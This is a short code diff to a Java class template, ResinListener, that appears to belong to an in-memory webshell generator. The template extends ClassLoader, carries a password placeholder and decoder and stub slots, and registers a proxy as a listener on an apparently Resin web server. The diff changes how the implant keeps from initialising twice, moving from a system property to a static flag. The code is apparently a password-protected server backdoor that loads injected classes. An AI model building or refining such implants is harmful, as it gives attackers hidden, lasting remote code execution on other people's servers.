@@ -4,6 +4,7 @@ import java.util.ArrayList;
 
 public class ResinListener extends ClassLoader implements InvocationHandler {{
     private static String password = "{password}";
+    private static boolean initialized = false;
 {common}
 {decoder}
 {stub}
@@ -40,7 +41,7 @@ public class ResinListener extends ClassLoader implements InvocationHandler {{
 
     public ResinListener() {{
         synchronized(lock) {{
-            if (System.getProperty("initialized") != null) {{
+            if (initialized != false) {{
                 return;
             }}
 
@@ -57,10 +58,9 @@ public class ResinListener extends ClassLoader implements InvocationHandler {{
                 );
                 try {{
                     addListener(proxyObject);
+                    initialized = true;
                 }} catch (Exception e) {{}}
             }}
-
-            System.setProperty("initialized", "true");
         }}
     }}
 
